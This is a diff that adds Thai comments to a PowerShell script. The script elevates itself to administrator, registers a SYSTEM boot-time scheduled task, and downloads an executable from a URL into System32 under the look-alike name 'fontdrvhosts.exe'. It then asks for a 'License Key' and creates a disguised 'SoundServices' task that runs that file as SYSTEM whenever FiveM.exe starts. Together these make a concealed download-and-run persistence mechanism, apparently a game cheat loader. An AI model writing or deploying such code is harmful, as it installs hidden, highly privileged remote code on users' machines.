@@ -1,17 +1,22 @@
-
+# ตรวจสอบสิทธิ์ผู้ดูแลระบบ
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Write-Host "ADMIN..."
     Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
 
+# สร้างตัวแปรสำหรับสคริปต์ที่จะรันหลังบูท
 $scriptPath = $PSCommandPath
 $taskName = "RunOnceAfterReboot"
 
+# สร้างคำสั่งให้รันสคริปต์นี้ตอนบูท (ONSTART) แล้วลบตัวเองหลังรันเสร็จ (/Z)
 $createTaskCmd = "schtasks /create /tn `"$taskName`" /tr `\"powershell.exe -ExecutionPolicy Bypass -File `\"$scriptPath`\"`\" /sc ONSTART /RL HIGHEST /F /RU SYSTEM /Z"
 
+# รันคำสั่งสร้าง Scheduled Task
 Invoke-Expression $createTaskCmd
 
+# ต่อไปนี้คือลอจิกของคุณที่ต้องการรันหลังบูท
+# ตัวอย่างเช่น:
 $system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
 $databasePath = Join-Path $system32Path "database.txt"
@@ -21,10 +26,13 @@ if ($exeUrl -match '^https?://') {
     Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
 }
 
+# ขอรหัส License Key จากผู้ใช้
 $key = Read-Host "Enter License Key"
 Set-Content -Path $databasePath -Value $key
 
+# สร้างงาน Scheduled Task สำหรับ process ของ FiveM
 $cmd = 'cmd /c schtasks /create /tn "SoundServices" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /ru SYSTEM'
 Invoke-Expression $cmd
 
+# เปิดใช้งานบันทึกการสร้าง process
 auditpol /set /subcategory:"Process Creation" /success:enable
